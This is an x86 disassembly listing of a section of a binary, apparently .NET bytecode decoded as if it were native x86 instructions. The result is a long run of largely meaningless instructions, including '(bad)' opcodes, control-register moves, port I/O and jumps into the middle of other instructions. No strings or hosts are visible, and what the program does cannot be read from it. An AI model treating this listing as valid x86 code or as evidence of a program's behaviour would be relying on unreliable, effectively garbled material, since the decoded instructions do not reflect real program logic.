  404cd0:	00 00                	add    %al,(%eax)
  404cd2:	00 7e 10             	add    %bh,0x10(%esi)
  404cd5:	00 00                	add    %al,(%eax)
  404cd7:	04 6f                	add    $0x6f,%al
  404cd9:	48                   	dec    %eax
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 6f a5             	or     -0x5b(%edi),%ch
  404cdf:	00 00                	add    %al,(%eax)
  404ce1:	0a 7e 20             	or     0x20(%esi),%bh
  404ce4:	00 00                	add    %al,(%eax)
  404ce6:	04 17                	add    $0x17,%al
  404ce8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ce9:	4b                   	dec    %ebx
  404cea:	00 00                	add    %al,(%eax)
  404cec:	0a 7e 1f             	or     0x1f(%esi),%bh
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	04 72                	add    $0x72,%al
  404cf3:	b7 0b                	mov    $0xb,%bh
  404cf5:	00 70 7e             	add    %dh,0x7e(%eax)
  404cf8:	19 00                	sbb    %eax,(%eax)
  404cfa:	00 04 6f             	add    %al,(%edi,%ebp,2)
  404cfd:	91                   	xchg   %eax,%ecx
  404cfe:	00 00                	add    %al,(%eax)
  404d00:	0a 72 bb             	or     -0x45(%edx),%dh
  404d03:	0b 00                	or     (%eax),%eax
  404d05:	70 28                	jo     0x404d2f
  404d07:	43                   	inc    %ebx
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	0a 6f 54             	or     0x54(%edi),%ch
  404d0d:	00 00                	add    %al,(%eax)
  404d0f:	0a 00                	or     (%eax),%al
  404d11:	de 0f                	fimuls (%edi)
  404d13:	25 28 2c 00 00       	and    $0x2c28,%eax
  404d18:	0a 0d 00 28 2d 00    	or     0x2d2800,%cl
  404d1e:	00 0a                	add    %cl,(%edx)
  404d20:	de 00                	fiadds (%eax)
  404d22:	00 00                	add    %al,(%eax)
  404d24:	7e 15                	jle    0x404d3b
  404d26:	00 00                	add    %al,(%eax)
  404d28:	04 13                	add    $0x13,%al
  404d2a:	11 11                	adc    %edx,(%ecx)
  404d2c:	11 2c 70             	adc    %ebp,(%eax,%esi,2)
  404d2f:	00 28                	add    %ch,(%eax)
  404d31:	a1 00 00 0a 18       	mov    0x180a0000,%eax
  404d36:	28 a2 00 00 0a 00    	sub    %ah,0xa0000(%edx)
  404d3c:	7e 19                	jle    0x404d57
  404d3e:	00 00                	add    %al,(%eax)
  404d40:	04 6f                	add    $0x6f,%al
  404d42:	91                   	xchg   %eax,%ecx
  404d43:	00 00                	add    %al,(%eax)
  404d45:	0a 1d 28 9d 00 00    	or     0x9d28,%bl
  404d4b:	0a 72 c9             	or     -0x37(%edx),%dh
  404d4e:	01 00                	add    %eax,(%eax)
  404d50:	70 7e                	jo     0x404dd0
  404d52:	1f                   	pop    %ds
  404d53:	00 00                	add    %al,(%eax)
  404d55:	04 72                	add    $0x72,%al
  404d57:	41                   	inc    %ecx
  404d58:	0a 00                	or     (%eax),%al
  404d5a:	70 28                	jo     0x404d84
  404d5c:	6c                   	insb   (%dx),%es:(%edi)
  404d5d:	00 00                	add    %al,(%eax)
  404d5f:	0a 17                	or     (%edi),%dl
  404d61:	28 a4 00 00 0a 00 1d 	sub    %ah,0x1d000a00(%eax,%eax,1)
  404d68:	28 9d 00 00 0a 72    	sub    %bl,0x720a0000(%ebp)
  404d6e:	c9                   	leave
  404d6f:	01 00                	add    %eax,(%eax)
  404d71:	70 7e                	jo     0x404df1
  404d73:	1f                   	pop    %ds
  404d74:	00 00                	add    %al,(%eax)
  404d76:	04 72                	add    $0x72,%al
  404d78:	41                   	inc    %ecx
  404d79:	0a 00                	or     (%eax),%al
  404d7b:	70 28                	jo     0x404da5
  404d7d:	6c                   	insb   (%dx),%es:(%edi)
  404d7e:	00 00                	add    %al,(%eax)
  404d80:	0a 19                	or     (%ecx),%bl
  404d82:	73 a6                	jae    0x404d2a
  404d84:	00 00                	add    %al,(%eax)
  404d86:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  404d8c:	de 10                	ficoms (%eax)
  404d8e:	25 28 2c 00 00       	and    $0x2c28,%eax
  404d93:	0a 13                	or     (%ebx),%dl
  404d95:	04 00                	add    $0x0,%al
  404d97:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404d9d:	00 00                	add    %al,(%eax)
  404d9f:	00 7e 27             	add    %bh,0x27(%esi)
  404da2:	00 00                	add    %al,(%eax)
  404da4:	04 13                	add    $0x13,%al
  404da6:	11 11                	adc    %edx,(%ecx)
  404da8:	11 2c 18             	adc    %ebp,(%eax,%ebx,1)
  404dab:	72 c5                	jb     0x404d72
  404dad:	0b 00                	or     (%eax),%eax
  404daf:	70 7e                	jo     0x404e2f
  404db1:	26 00 00             	add    %al,%es:(%eax)
  404db4:	04 28                	add    $0x28,%al
  404db6:	4a                   	dec    %edx
  404db7:	00 00                	add    %al,(%eax)
  404db9:	0a 16                	or     (%esi),%dl
  404dbb:	16                   	push   %ss
  404dbc:	15 28 56 00 00       	adc    $0x5628,%eax
  404dc1:	0a 26                	or     (%esi),%ah
  404dc3:	00 7e 25             	add    %bh,0x25(%esi)
  404dc6:	00 00                	add    %al,(%eax)
  404dc8:	04 13                	add    $0x13,%al
  404dca:	11 11                	adc    %edx,(%ecx)
  404dcc:	11 2c 20             	adc    %ebp,(%eax,%eiz,1)
  404dcf:	00 28                	add    %ch,(%eax)
  404dd1:	a1 00 00 0a 18       	mov    0x180a0000,%eax
  404dd6:	28 a2 00 00 0a 00    	sub    %ah,0xa0000(%edx)
  404ddc:	de 10                	ficoms (%eax)
  404dde:	25 28 2c 00 00       	and    $0x2c28,%eax
  404de3:	0a 13                	or     (%ebx),%dl
  404de5:	05 00 28 2d 00       	add    $0x2d2800,%eax
  404dea:	00 0a                	add    %cl,(%edx)
  404dec:	de 00                	fiadds (%eax)
  404dee:	00 00                	add    %al,(%eax)
  404df0:	7e 28                	jle    0x404e1a
  404df2:	00 00                	add    %al,(%eax)
  404df4:	04 13                	add    $0x13,%al
  404df6:	11 11                	adc    %edx,(%ecx)
  404df8:	11 39                	adc    %edi,(%ecx)
  404dfa:	11 01                	adc    %eax,(%ecx)
  404dfc:	00 00                	add    %al,(%eax)
  404dfe:	72 e7                	jb     0x404de7
  404e00:	0b 00                	or     (%eax),%eax
  404e02:	70 13                	jo     0x404e17
  404e04:	08 7e 29             	or     %bh,0x29(%esi)
  404e07:	00 00                	add    %al,(%eax)
  404e09:	04 13                	add    $0x13,%al
  404e0b:	09 18                	or     %ebx,(%eax)
  404e0d:	13 0a                	adc    (%edx),%ecx
  404e0f:	28 04 00             	sub    %al,(%eax,%eax,1)
  404e12:	00 06                	add    %al,(%esi)
  404e14:	6f                   	outsl  %ds:(%esi),(%dx)
  404e15:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	0a 6f a8             	or     -0x58(%edi),%ch
  404e1b:	00 00                	add    %al,(%eax)
  404e1d:	0a 6f a9             	or     -0x57(%edi),%ch
  404e20:	00 00                	add    %al,(%eax)
  404e22:	0a 13                	or     (%ebx),%dl
  404e24:	06                   	push   %es
  404e25:	28 aa 00 00 0a 13    	sub    %ch,0x130a0000(%edx)
  404e2b:	07                   	pop    %es
  404e2c:	11 07                	adc    %eax,(%edi)
  404e2e:	13 10                	adc    (%eax),%edx
  404e30:	16                   	push   %ss
  404e31:	13 0f                	adc    (%edi),%ecx
  404e33:	38 c6                	cmp    %al,%dh
  404e35:	00 00                	add    %al,(%eax)
  404e37:	00 11                	add    %dl,(%ecx)
  404e39:	10 11                	adc    %dl,(%ecx)
  404e3b:	0f 9a 13             	setp   (%ebx)
  404e3e:	06                   	push   %es
  404e3f:	00 28                	add    %ch,(%eax)
  404e41:	a1 00 00 0a 11       	mov    0x110a0000,%eax
  404e46:	06                   	push   %es
  404e47:	11 09                	adc    %ecx,(%ecx)
  404e49:	28 4a 00             	sub    %cl,0x0(%edx)
  404e4c:	00 0a                	add    %cl,(%edx)
  404e4e:	28 ab 00 00 0a 00    	sub    %ch,0xa0000(%ebx)
  404e54:	11 06                	adc    %eax,(%esi)
  404e56:	11 09                	adc    %ecx,(%ecx)
  404e58:	28 4a 00             	sub    %cl,0x0(%edx)
  404e5b:	00 0a                	add    %cl,(%edx)
  404e5d:	11 0a                	adc    %ecx,(%edx)
  404e5f:	28 a2 00 00 0a 00    	sub    %ah,0xa0000(%edx)
  404e65:	de 10                	ficoms (%eax)
  404e67:	25 28 2c 00 00       	and    $0x2c28,%eax
  404e6c:	0a 13                	or     (%ebx),%dl
  404e6e:	0b 00                	or     (%eax),%eax
  404e70:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404e76:	00 00                	add    %al,(%eax)
  404e78:	00 11                	add    %dl,(%ecx)
  404e7a:	06                   	push   %es
  404e7b:	72 c9                	jb     0x404e46
  404e7d:	01 00                	add    %eax,(%eax)
  404e7f:	70 11                	jo     0x404e92
  404e81:	08 28                	or     %ch,(%eax)
  404e83:	43                   	inc    %ebx
  404e84:	00 00                	add    %al,(%eax)
  404e86:	0a 73 ac             	or     -0x54(%ebx),%dh
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	0a 13                	or     (%ebx),%dl
  404e8d:	0c 11                	or     $0x11,%al
  404e8f:	0c 72                	or     $0x72,%al
  404e91:	ff 0b                	decl   (%ebx)
  404e93:	00 70 6f             	add    %dh,0x6f(%eax)
  404e96:	ad                   	lods   %ds:(%esi),%eax
  404e97:	00 00                	add    %al,(%eax)
  404e99:	0a 00                	or     (%eax),%al
  404e9b:	11 0c 72             	adc    %ecx,(%edx,%esi,2)
  404e9e:	13 0c 00             	adc    (%eax,%eax,1),%ecx
  404ea1:	70 11                	jo     0x404eb4
  404ea3:	06                   	push   %es
  404ea4:	11 09                	adc    %ecx,(%ecx)
  404ea6:	28 43 00             	sub    %al,0x0(%ebx)
  404ea9:	00 0a                	add    %cl,(%edx)
  404eab:	6f                   	outsl  %ds:(%esi),(%dx)
  404eac:	ad                   	lods   %ds:(%esi),%eax
  404ead:	00 00                	add    %al,(%eax)
  404eaf:	0a 00                	or     (%eax),%al
  404eb1:	11 0c 72             	adc    %ecx,(%edx,%esi,2)
  404eb4:	1f                   	pop    %ds
  404eb5:	0c 00                	or     $0x0,%al
  404eb7:	70 11                	jo     0x404eca
  404eb9:	06                   	push   %es
  404eba:	28 4a 00             	sub    %cl,0x0(%edx)
  404ebd:	00 0a                	add    %cl,(%edx)
  404ebf:	17                   	pop    %ss
  404ec0:	8c 2c 00             	mov    %gs,(%eax,%eax,1)
  404ec3:	00 01                	add    %al,(%ecx)
  404ec5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ec6:	ae                   	scas   %es:(%edi),%al
  404ec7:	00 00                	add    %al,(%eax)
  404ec9:	0a 00                	or     (%eax),%al
  404ecb:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  404ece:	af                   	scas   %es:(%edi),%eax
  404ecf:	00 00                	add    %al,(%eax)
  404ed1:	0a 00                	or     (%eax),%al
  404ed3:	11 06                	adc    %eax,(%esi)
  404ed5:	11 08                	adc    %ecx,(%eax)
  404ed7:	28 4a 00             	sub    %cl,0x0(%edx)
  404eda:	00 0a                	add    %cl,(%edx)
  404edc:	11 0a                	adc    %ecx,(%edx)
  404ede:	28 a2 00 00 0a 00    	sub    %ah,0xa0000(%edx)
  404ee4:	de 10                	ficoms (%eax)
  404ee6:	25 28 2c 00 00       	and    $0x2c28,%eax
  404eeb:	0a 13                	or     (%ebx),%dl
  404eed:	0d 00 28 2d 00       	or     $0x2d2800,%eax
  404ef2:	00 0a                	add    %cl,(%edx)
  404ef4:	de 00                	fiadds (%eax)
  404ef6:	00 11                	add    %dl,(%ecx)
  404ef8:	0f                   	movhps %xmm2,(bad)
  404ef9:	17                   	pop    %ss
  404efa:	d6                   	salc
  404efb:	13 0f                	adc    (%edi),%ecx
  404efd:	00 11                	add    %dl,(%ecx)
  404eff:	0f 11 10             	movups %xmm2,(%eax)
  404f02:	8e b7 fe 04 13 11    	mov    0x111304fe(%edi),%?
  404f08:	11 11                	adc    %edx,(%ecx)
  404f0a:	3a 29                	cmp    (%ecx),%ch
  404f0c:	ff                   	(bad)
  404f0d:	ff                   	(bad)
  404f0e:	ff 00                	incl   (%eax)
  404f10:	00 2a                	add    %ch,(%edx)
  404f12:	00 00                	add    %al,(%eax)
  404f14:	01 64 00 00          	add    %esp,0x0(%eax,%eax,1)
  404f18:	00 00                	add    %al,(%eax)
  404f1a:	55                   	push   %ebp
  404f1b:	00 a0 f5 00 15 20    	add    %ah,0x201500f5(%eax)
  404f21:	00 00                	add    %al,(%eax)
  404f23:	01 00                	add    %eax,(%eax)
  404f25:	00 0d 01 56 63 01    	add    %cl,0x1635601
  404f2b:	0f 20 00             	mov    %cr0,%eax
  404f2e:	00 01                	add    %al,(%ecx)
  404f30:	00 00                	add    %al,(%eax)
  404f32:	82 01 40             	addb   $0x40,(%ecx)
  404f35:	c2 01 0f             	ret    $0xf01
  404f38:	20 00                	and    %al,(%eax)
  404f3a:	00 01                	add    %al,(%ecx)
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	d3 01                	roll   %cl,(%ecx)
  404f40:	40                   	inc    %eax
  404f41:	13 02                	adc    (%edx),%eax
  404f43:	0f 20 00             	mov    %cr0,%eax
  404f46:	00 01                	add    %al,(%ecx)
  404f48:	00 00                	add    %al,(%eax)
  404f4a:	30 02                	xor    %al,(%edx)
  404f4c:	5e                   	pop    %esi
  404f4d:	8e 02                	mov    (%edx),%es
  404f4f:	10 20                	adc    %ah,(%eax)
  404f51:	00 00                	add    %al,(%eax)
  404f53:	01 00                	add    %eax,(%eax)
  404f55:	00 d0                	add    %dl,%al
  404f57:	02 0e                	add    (%esi),%cl
  404f59:	de 02                	fiadds (%edx)
  404f5b:	10 20                	adc    %ah,(%eax)
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	01 00                	add    %eax,(%eax)
  404f61:	00 40 03             	add    %al,0x3(%eax)
  404f64:	27                   	daa
  404f65:	67 03 10             	add    (%bx,%si),%edx
  404f68:	20 00                	and    %al,(%eax)
  404f6a:	00 01                	add    %al,(%ecx)
  404f6c:	00 00                	add    %al,(%eax)
  404f6e:	79 03                	jns    0x404f73
  404f70:	6d                   	insl   (%dx),%es:(%edi)
  404f71:	e6 03                	out    %al,$0x3
  404f73:	10 20                	adc    %ah,(%eax)
  404f75:	00 00                	add    %al,(%eax)
  404f77:	01 1b                	add    %ebx,(%ebx)
  404f79:	30 05 00 a6 03 00    	xor    %al,0x3a600
  404f7f:	00 19                	add    %bl,(%ecx)
  404f81:	00 00                	add    %al,(%eax)
  404f83:	11 00                	adc    %eax,(%eax)
  404f85:	28 b0 00 00 0a 14    	sub    %dh,0x140a0000(%eax)
  404f8b:	fe 01                	incb   (%ecx)
  404f8d:	16                   	push   %ss
  404f8e:	fe 01                	incb   (%ecx)
  404f90:	13 11                	adc    (%ecx),%edx
  404f92:	11 11                	adc    %edx,(%ecx)
  404f94:	2c 3e                	sub    $0x3e,%al
  404f96:	00 7e 10             	add    %bh,0x10(%esi)
  404f99:	00 00                	add    %al,(%eax)
  404f9b:	04 6f                	add    $0x6f,%al
  404f9d:	48                   	dec    %eax
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 6f 49             	or     0x49(%edi),%ch
  404fa3:	00 00                	add    %al,(%eax)
  404fa5:	0a 72 3b             	or     0x3b(%edx),%dh
  404fa8:	0c 00                	or     $0x0,%al
  404faa:	70 72                	jo     0x40501e
  404fac:	21 09                	and    %ecx,(%ecx)
  404fae:	00 70 6f             	add    %dh,0x6f(%eax)
  404fb1:	54                   	push   %esp
  404fb2:	00 00                	add    %al,(%eax)
  404fb4:	0a 00                	or     (%eax),%al
  404fb6:	de 10                	ficoms (%eax)
  404fb8:	25 28 2c 00 00       	and    $0x2c28,%eax
  404fbd:	0a 13                	or     (%ebx),%dl
  404fbf:	04 00                	add    $0x0,%al
  404fc1:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404fc7:	00 00                	add    %al,(%eax)
  404fc9:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  404fcf:	36 00 00             	add    %al,%ss:(%eax)
  404fd2:	0a 00                	or     (%eax),%al
  404fd4:	00 16                	add    %dl,(%esi)
  404fd6:	0a 17                	or     (%edi),%dl
  404fd8:	7e 1f                	jle    0x404ff9
  404fda:	00 00                	add    %al,(%eax)
  404fdc:	04 12                	add    $0x12,%al
  404fde:	00 73 b1             	add    %dh,-0x4f(%ebx)
  404fe1:	00 00                	add    %al,(%eax)
  404fe3:	0a 80 1b 00 00 04    	or     0x400001b(%eax),%al
  404fe9:	06                   	push   %es
  404fea:	16                   	push   %ss
  404feb:	fe 01                	incb   (%ecx)
  404fed:	13 11                	adc    (%ecx),%edx
  404fef:	11 11                	adc    %edx,(%ecx)
  404ff1:	2c 06                	sub    $0x6,%al
  404ff3:	28 90 00 00 0a 00    	sub    %dl,0xa0000(%eax)
  404ff9:	00 28                	add    %ch,(%eax)
  404ffb:	31 00                	xor    %eax,(%eax)
  404ffd:	00 06                	add    %al,(%esi)
  404fff:	00 7e 14             	add    %bh,0x14(%esi)
  405002:	00 00                	add    %al,(%eax)
  405004:	04 16                	add    $0x16,%al
  405006:	fe 01                	incb   (%ecx)
  405008:	13 11                	adc    (%ecx),%edx
  40500a:	11 11                	adc    %edx,(%ecx)
  40500c:	2c 23                	sub    $0x23,%al
  40500e:	7e 19                	jle    0x405029
  405010:	00 00                	add    %al,(%eax)
  405012:	04 6f                	add    $0x6f,%al
  405014:	30 00                	xor    %al,(%eax)
  405016:	00 0a                	add    %cl,(%edx)
  405018:	80 0f 00             	orb    $0x0,(%edi)
  40501b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40501e:	19 00                	sbb    %eax,(%eax)
  405020:	00 04 6f             	add    %al,(%edi,%ebp,2)
  405023:	33 00                	xor    (%eax),%eax
  405025:	00 0a                	add    %cl,(%edx)
  405027:	6f                   	outsl  %ds:(%esi),(%dx)
  405028:	34 00                	xor    $0x0,%al
  40502a:	00 0a                	add    %cl,(%edx)
  40502c:	80 0e 00             	orb    $0x0,(%esi)
  40502f:	00 04 00             	add    %al,(%eax,%eax,1)
  405032:	14 fe                	adc    $0xfe,%al
  405034:	06                   	push   %es
  405035:	37                   	aaa
  405036:	00 00                	add    %al,(%eax)
  405038:	06                   	push   %es
  405039:	73 b2                	jae    0x404fed
  40503b:	00 00                	add    %al,(%eax)
  40503d:	0a 17                	or     (%edi),%dl
  40503f:	73 b3                	jae    0x404ff4
  405041:	00 00                	add    %al,(%eax)
  405043:	0a 0b                	or     (%ebx),%cl
  405045:	07                   	pop    %es
  405046:	6f                   	outsl  %ds:(%esi),(%dx)
  405047:	b4 00                	mov    $0x0,%ah
  405049:	00 0a                	add    %cl,(%edx)
  40504b:	00 00                	add    %al,(%eax)
  40504d:	73 3e                	jae    0x40508d
  40504f:	00 00                	add    %al,(%eax)
  405051:	06                   	push   %es
  405052:	80 17 00             	adcb   $0x0,(%edi)
  405055:	00 04 7e             	add    %al,(%esi,%edi,2)
  405058:	17                   	pop    %ss
  405059:	00 00                	add    %al,(%eax)
  40505b:	04 25                	add    $0x25,%al
  40505d:	fe 07                	incb   (%edi)
  40505f:	48                   	dec    %eax
  405060:	00 00                	add    %al,(%eax)
  405062:	06                   	push   %es
  405063:	73 b2                	jae    0x405017
  405065:	00 00                	add    %al,(%eax)
  405067:	0a 17                	or     (%edi),%dl
  405069:	73 b3                	jae    0x40501e
  40506b:	00 00                	add    %al,(%eax)
  40506d:	0a 13                	or     (%ebx),%dl
  40506f:	05 11 05 6f b4       	add    $0xb46f0511,%eax
  405074:	00 00                	add    %al,(%eax)
  405076:	0a 00                	or     (%eax),%al
  405078:	de 10                	ficoms (%eax)
  40507a:	25 28 2c 00 00       	and    $0x2c28,%eax
  40507f:	0a 13                	or     (%ebx),%dl
  405081:	06                   	push   %es
  405082:	00 28                	add    %ch,(%eax)
  405084:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  405089:	00 00                	add    %al,(%eax)
  40508b:	7e 2a                	jle    0x4050b7
  40508d:	00 00                	add    %al,(%eax)
  40508f:	04 13                	add    $0x13,%al
  405091:	11 11                	adc    %edx,(%ecx)
  405093:	11 2c 24             	adc    %ebp,(%esp)
  405096:	73 49                	jae    0x4050e1
  405098:	00 00                	add    %al,(%eax)
  40509a:	06                   	push   %es
  40509b:	13 08                	adc    (%eax),%ecx
  40509d:	11 08                	adc    %ecx,(%eax)
  40509f:	25 fe 07 53 00       	and    $0x5307fe,%eax
  4050a4:	00 06                	add    %al,(%esi)
  4050a6:	73 b2                	jae    0x40505a
  4050a8:	00 00                	add    %al,(%eax)
  4050aa:	0a 73 b5             	or     -0x4b(%ebx),%dh
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	0a 13                	or     (%ebx),%dl
  4050b1:	07                   	pop    %es
  4050b2:	11 07                	adc    %eax,(%edi)
  4050b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4050b5:	b4 00                	mov    $0x0,%ah
  4050b7:	00 0a                	add    %cl,(%edx)
  4050b9:	00 00                	add    %al,(%eax)
  4050bb:	16                   	push   %ss
  4050bc:	0c 72                	or     $0x72,%al
  4050be:	69 00 00 70 0d 7e    	imul   $0x7e0d7000,(%eax),%eax
  4050c4:	0b 00                	or     (%eax),%eax
  4050c6:	00 04 13             	add    %al,(%ebx,%edx,1)
  4050c9:	11 11                	adc    %edx,(%ecx)
  4050cb:	11 2c 2d 00 14 fe 06 	adc    %ebp,0x6fe1400(,%ebp,1)
  4050d2:	16                   	push   %ss
  4050d3:	00 00                	add    %al,(%eax)
  4050d5:	06                   	push   %es
  4050d6:	73 b6                	jae    0x40508e
  4050d8:	00 00                	add    %al,(%eax)
  4050da:	0a 28                	or     (%eax),%ch
  4050dc:	b7 00                	mov    $0x0,%bh
  4050de:	00 0a                	add    %cl,(%edx)
  4050e0:	00 17                	add    %dl,(%edi)
  4050e2:	28 36                	sub    %dh,(%esi)
  4050e4:	00 00                	add    %al,(%eax)
  4050e6:	06                   	push   %es
  4050e7:	00 de                	add    %bl,%dh
  4050e9:	10 25 28 2c 00 00    	adc    %ah,0x2c28
  4050ef:	0a 13                	or     (%ebx),%dl
  4050f1:	09 00                	or     %eax,(%eax)
  4050f3:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4050f9:	00 00                	add    %al,(%eax)
  4050fb:	00 38                	add    %bh,(%eax)
  4050fd:	1d 02 00 00 20       	sbb    $0x20000002,%eax
  405102:	e8 03 00 00 28       	call   0x2840510a
  405107:	36 00 00             	add    %al,%ss:(%eax)
  40510a:	0a 00                	or     (%eax),%al
  40510c:	7e 0d                	jle    0x40511b
  40510e:	00 00                	add    %al,(%eax)
  405110:	04 16                	add    $0x16,%al
  405112:	fe 01                	incb   (%ecx)
  405114:	13 11                	adc    (%ecx),%edx
  405116:	11 11                	adc    %edx,(%ecx)
  405118:	2c 06                	sub    $0x6,%al
  40511a:	72 69                	jb     0x405185
  40511c:	00 00                	add    %al,(%eax)
  40511e:	70 0d                	jo     0x40512d
  405120:	00 28                	add    %ch,(%eax)
  405122:	b8 00 00 0a 00       	mov    $0xa0000,%eax
  405127:	00 08                	add    %cl,(%eax)
  405129:	17                   	pop    %ss
  40512a:	d6                   	salc
  40512b:	0c 08                	or     $0x8,%al
  40512d:	1b fe                	sbb    %esi,%edi
  40512f:	01 13                	add    %edx,(%ebx)
  405131:	11 11                	adc    %edx,(%ecx)
  405133:	11 2c 29             	adc    %ebp,(%ecx,%ebp,1)
  405136:	00 28                	add    %ch,(%eax)
  405138:	b9 00 00 0a 20       	mov    $0x200a0000,%ecx
  40513d:	00 04 00             	add    %al,(%eax,%eax,1)
  405140:	00 28                	add    %ch,(%eax)
  405142:	ba 00 00 0a 6f       	mov    $0x6f0a0000,%edx
  405147:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  40514c:	de 10                	ficoms (%eax)
  40514e:	25 28 2c 00 00       	and    $0x2c28,%eax
  405153:	0a 13                	or     (%ebx),%dl
  405155:	0a 00                	or     (%eax),%al
  405157:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 08                	add    %cl,(%eax)
  405161:	1e                   	push   %ds
  405162:	fe 04 16             	incb   (%esi,%edx,1)
  405165:	fe 01                	incb   (%ecx)
  405167:	13 11                	adc    (%ecx),%edx
  405169:	11 11                	adc    %edx,(%ecx)
  40516b:	2c 39                	sub    $0x39,%al
  40516d:	16                   	push   %ss
  40516e:	0c 28                	or     $0x28,%al
  405170:	17                   	pop    %ss
  405171:	00 00                	add    %al,(%eax)
  405173:	06                   	push   %es
  405174:	13 0b                	adc    (%ebx),%ecx
  405176:	09 11                	or     %edx,(%ecx)
  405178:	0b 16                	or     (%esi),%edx
  40517a:	28 32                	sub    %dh,(%edx)
  40517c:	00 00                	add    %al,(%eax)
  40517e:	0a 16                	or     (%esi),%dl
  405180:	fe 01                	incb   (%ecx)
  405182:	16                   	push   %ss
  405183:	fe 01                	incb   (%ecx)
  405185:	13 11                	adc    (%ecx),%edx
  405187:	11 11                	adc    %edx,(%ecx)
  405189:	2c 1a                	sub    $0x1a,%al
  40518b:	11 0b                	adc    %ecx,(%ebx)
  40518d:	0d 72 41 0c 00       	or     $0xc4172,%eax
  405192:	70 7e                	jo     0x405212
  405194:	24 00                	and    $0x0,%al
  405196:	00 04 11             	add    %al,(%ecx,%edx,1)
  405199:	0b 28                	or     (%eax),%ebp
  40519b:	43                   	inc    %ebx
  40519c:	00 00                	add    %al,(%eax)
  40519e:	0a 28                	or     (%eax),%ch
  4051a0:	39 00                	cmp    %eax,(%eax)
  4051a2:	00 06                	add    %al,(%esi)
  4051a4:	26 00 00             	add    %al,%es:(%eax)
  4051a7:	7e 16                	jle    0x4051bf
  4051a9:	00 00                	add    %al,(%eax)
  4051ab:	04 13                	add    $0x13,%al
  4051ad:	11 11                	adc    %edx,(%ecx)
  4051af:	11 39                	adc    %edi,(%ecx)
  4051b1:	54                   	push   %esp
  4051b2:	01 00                	add    %eax,(%eax)
  4051b4:	00 00                	add    %al,(%eax)
  4051b6:	7e 10                	jle    0x4051c8
  4051b8:	00 00                	add    %al,(%eax)
  4051ba:	04 6f                	add    $0x6f,%al
  4051bc:	48                   	dec    %eax
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	0a 6f 49             	or     0x49(%edi),%ch
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	0a 7e 20             	or     0x20(%esi),%bh
  4051c7:	00 00                	add    %al,(%eax)
  4051c9:	04 72                	add    $0x72,%al
  4051cb:	c9                   	leave
  4051cc:	01 00                	add    %eax,(%eax)
  4051ce:	70 7e                	jo     0x40524e
  4051d0:	1f                   	pop    %ds
  4051d1:	00 00                	add    %al,(%eax)
  4051d3:	04 28                	add    $0x28,%al
  4051d5:	43                   	inc    %ebx
  4051d6:	00 00                	add    %al,(%eax)
  4051d8:	0a 72 69             	or     0x69(%edx),%dh
  4051db:	00 00                	add    %al,(%eax)
  4051dd:	70 6f                	jo     0x40524e
  4051df:	4f                   	dec    %edi
  4051e0:	00 00                	add    %al,(%eax)
  4051e2:	0a 28                	or     (%eax),%ch
  4051e4:	0c 00                	or     $0x0,%al
  4051e6:	00 0a                	add    %cl,(%edx)
  4051e8:	72 b7                	jb     0x4051a1
  4051ea:	0b 00                	or     (%eax),%eax
  4051ec:	70 7e                	jo     0x40526c
  4051ee:	19 00                	sbb    %eax,(%eax)
  4051f0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4051f3:	91                   	xchg   %eax,%ecx
  4051f4:	00 00                	add    %al,(%eax)
  4051f6:	0a 72 bb             	or     -0x45(%edx),%dh
  4051f9:	0b 00                	or     (%eax),%eax
  4051fb:	70 28                	jo     0x405225
  4051fd:	43                   	inc    %ebx
  4051fe:	00 00                	add    %al,(%eax)
  405200:	0a 16                	or     (%esi),%dl
  405202:	28 bc 00 00 0a 13 12 	sub    %bh,0x12130a00(%eax,%eax,1)
  405209:	11 12                	adc    %edx,(%edx)
  40520b:	2c 3e                	sub    $0x3e,%al
  40520d:	7e 10                	jle    0x40521f
  40520f:	00 00                	add    %al,(%eax)
  405211:	04 6f                	add    $0x6f,%al
  405213:	48                   	dec    %eax
  405214:	00 00                	add    %al,(%eax)
  405216:	0a 6f 49             	or     0x49(%edi),%ch
  405219:	00 00                	add    %al,(%eax)
  40521b:	0a 7e 20             	or     0x20(%esi),%bh
  40521e:	00 00                	add    %al,(%eax)
  405220:	04 17                	add    $0x17,%al
  405222:	6f                   	outsl  %ds:(%esi),(%dx)
  405223:	4b                   	dec    %ebx
  405224:	00 00                	add    %al,(%eax)
  405226:	0a 7e 1f             	or     0x1f(%esi),%bh
  405229:	00 00                	add    %al,(%eax)
  40522b:	04 72                	add    $0x72,%al
  40522d:	b7 0b                	mov    $0xb,%bh
  40522f:	00 70 7e             	add    %dh,0x7e(%eax)
  405232:	19 00                	sbb    %eax,(%eax)
  405234:	00 04 6f             	add    %al,(%edi,%ebp,2)
  405237:	91                   	xchg   %eax,%ecx
  405238:	00 00                	add    %al,(%eax)
  40523a:	0a 72 bb             	or     -0x45(%edx),%dh
  40523d:	0b 00                	or     (%eax),%eax
  40523f:	70 28                	jo     0x405269
  405241:	43                   	inc    %ebx
  405242:	00 00                	add    %al,(%eax)
  405244:	0a 6f 54             	or     0x54(%edi),%ch
  405247:	00 00                	add    %al,(%eax)
  405249:	0a 00                	or     (%eax),%al
  40524b:	00 de                	add    %bl,%dh
  40524d:	10 25 28 2c 00 00    	adc    %ah,0x2c28
